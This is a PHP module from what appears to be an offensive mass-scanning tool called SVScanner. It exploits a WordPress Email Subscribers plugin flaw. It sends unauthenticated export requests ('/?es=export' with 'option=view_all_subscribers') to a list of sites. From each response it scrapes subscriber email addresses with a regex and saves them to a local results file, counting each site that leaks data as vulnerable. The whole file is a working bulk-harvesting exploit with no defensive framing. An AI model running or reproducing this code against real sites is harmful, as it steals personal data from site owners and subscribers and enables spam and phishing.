<?php
error_reporting(0);
/**
 * @Author: Eka Syahwan
 * @Date:   2018-09-06 23:02:10
 * @Last Modified by:   shor7cut
 * @Last Modified time: 2018-09-12 08:50:03
 */
class Exploit_Plugins_emailsubscribers
{
	function __construct()
	{
		$this->wploit_modules 	= new wploit_modules;
		$this->sdata 			= new Sdata;
		$this->database 		= new Database;
	}
	function scanner($array_url , $datcommand){
		##########################################################################
		mkdir("result");
		mkdir("result/exploit");
		$fopn = fopen("result/exploit/Email Subscribers.txt", "a+");
		##########################################################################
		echo "\r\n".$this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","Trying exploits ... [ ".count($array_url)." Request | ".$datcommand."]\r\n");
		foreach ($array_url as $key => $dataURL) {
			$url[] =  array('url' 		=> $dataURL['url']."/?es=export");
			$hea[] =  array('follow' 	=> false,'post' => "option=view_all_subscribers");
		}
		$respons   = $this->sdata->sdata($url,$hea); $this->sdata->session_remove($respons); unset($url);unset($hea);
		foreach ($respons as $key => $value) {

			$_SESSION['total_size'] = ($_SESSION['total_size']+$value['info']['http_code']);
			$_SESSION['temp_size']  = ($_SESSION['temp_size']+$value['info']['http_code']);

			preg_match_all('#[A-Z0-9a-z._%+-]+@[A-Za-z0-9.+-]+#', $value['respons'], $matches);
			if(!empty($matches[0])){
				echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$value['info']['http_code']."] ".$value['info']['url'])." => ".$this->wploit_modules->color("green","[ Email Found : ". count($matches[0]) ." ]")."\r\n";
				
				$_SESSION['site_vuln'] = ($_SESSION['site_vuln']+1);

				foreach ($matches[0] as $key => $Email) {
					fwrite($fopn, $Email."\r\n");
					$_SESSION['email'] = ($_SESSION['email']+1);
				}

			}else{
				echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$value['info']['http_code']."] ".$value['info']['url'])." => ".$this->wploit_modules->color("red","[ Not Vuln ]")."\r\n";
				$_SESSION['failed'] = ($_SESSION['failed']+1);
			}
		}

		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","[ Download Size : ".$this->wploit_modules->formatSizeUnits($_SESSION['temp_size'])." | Total Download : ".$this->wploit_modules->formatSizeUnits($_SESSION['total_size']).")\r\n");
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","[ Total Email   : ".$_SESSION['email']."\r\n");
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","[ Total Email   : ".$_SESSION['email']."\r\n");
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","[ Site Vuln     : ".$_SESSION['site_vuln']."\r\n");
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","[ Not Vuln      : ".$_SESSION['failed']."\r\n");

		fclose($fopn);
		unset($_SESSION['temp_size']);

	}
}